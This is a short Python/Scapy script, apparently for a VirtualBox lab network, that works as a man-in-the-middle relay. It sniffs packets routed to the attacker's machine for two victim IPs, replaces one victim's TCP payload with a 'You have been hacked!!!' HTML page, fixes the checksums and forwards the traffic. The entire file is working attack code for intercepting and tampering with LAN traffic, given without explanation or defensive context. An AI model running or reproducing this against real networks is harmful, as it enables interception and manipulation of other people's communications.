from scapy.all import *
load_layer("http") 

import time

import threading

ATTACKER_MAC = get_if_hwaddr("enp0s3")
ATTACKER_IP = get_if_addr("enp0s3")

victims1 = [("08:00:27:b7:c4:af", "192.168.56.101"), ("08:00:27:cc:08:6f", "192.168.56.102")]
victims2 = [("08:00:27:b7:c4:af", "192.168.56.101"), ("08:00:27:cc:08:6f", "192.168.56.102")]


ipVictim = "192.168.56.101"


ip_to_spoof = "192.168.56.102"
mac_to_spoof = "08:00:27:b7:c4:af"


def read_packets(attacker_mac, spoofed_ip, spoofed_mac):
    print("[*] Sniffing packets for " + spoofed_ip + "...")
    while True:
        pkt = sniff(count=1, iface="enp0s3", filter="not icmp and not arp and ether dst "+attacker_mac+" and ip dst "+spoofed_ip)[0] # 
        print("Packet found for " + spoofed_ip)

        # check if packet is for victim
        if (spoofed_ip == "192.168.56.101" and pkt.haslayer(Raw) and pkt.haslayer(TCP)):
            # read packets / add packets to file
            pkt[Raw].load = b'<html><body><h1>You have been hacked!!!</h1></body></html>'
            pkt[IP].len = None
            pkt[IP].chksum = None
            pkt[TCP].chksum = None

        # send packets to victim
        pkt[Ether].dst = spoofed_mac
        sendp(pkt, iface="enp0s3")

def main():
    for victim in victims1:
        threading.Thread(target=read_packets, args=(ATTACKER_MAC, victim[1], victim[0]), daemon=True).start()

    # wait for ctrl+c to exit application
    try: 
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[*] Shutting down...")
        sys.exit(0)

if __name__ == "__main__":
    main()
    print("Done")















